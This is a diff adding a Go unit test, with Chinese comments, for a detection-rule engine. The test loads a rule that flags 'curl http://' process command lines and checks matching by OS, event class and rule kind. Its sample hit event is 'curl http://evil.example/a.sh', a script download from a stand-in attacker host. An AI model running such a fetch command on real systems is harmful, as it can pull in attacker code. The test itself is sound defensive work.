@@ -657,3 +657,51 @@ func TestCIDRWindashRegexFlags(t *testing.T) {
 		t.Error("非法网段应拒绝加载")
 	}
 }
+
+// Rule.Matches 单规则独立求值：校验类别过滤、操作系统过滤、单事件匹配与时序规则排除。
+func TestRuleMatchesSingleRule(t *testing.T) {
+	dir := t.TempDir()
+	ruleBody := `
+id: bt-rule-1
+title: Suspicious curl download
+logsource:
+  category: process_creation
+  product: linux
+detection:
+  selection:
+    CommandLine|contains: 'curl http://'
+  condition: selection
+level: medium
+`
+	if err := os.WriteFile(filepath.Join(dir, "bt.yml"), []byte(ruleBody), 0o600); err != nil {
+		t.Fatal(err)
+	}
+	eng := LoadDir(dir)
+	rules := eng.Rules()
+	if len(rules) != 1 {
+		t.Fatalf("expected 1 rule, got %d", len(rules))
+	}
+	r := rules[0]
+	hitRaw := map[string]any{"process": map[string]any{"cmd_line": "curl http://evil.example/a.sh"}}
+	missRaw := map[string]any{"process": map[string]any{"cmd_line": "ls -la"}}
+
+	if !r.Matches(1007, "linux", hitRaw) {
+		t.Error("Matches 应命中匹配的 Linux 进程事件")
+	}
+	if !r.Matches(1007, "", hitRaw) {
+		t.Error("资产 OS 未知时 Matches 也应求值并命中")
+	}
+	if r.Matches(1007, "windows", hitRaw) {
+		t.Error("Linux 规则不应在 Windows 资产事件上命中")
+	}
+	if r.Matches(4001, "linux", hitRaw) {
+		t.Error("进程规则不应在网络事件 class=4001 上命中")
+	}
+	if r.Matches(1007, "linux", missRaw) {
+		t.Error("不满足条件的不应命中")
+	}
+	temporal := &Rule{ID: "seq", Kind: "sequence"}
+	if temporal.Matches(1007, "linux", hitRaw) {
+		t.Error("跨事件时序规则 Matches 应恒返回 false")
+	}
+}
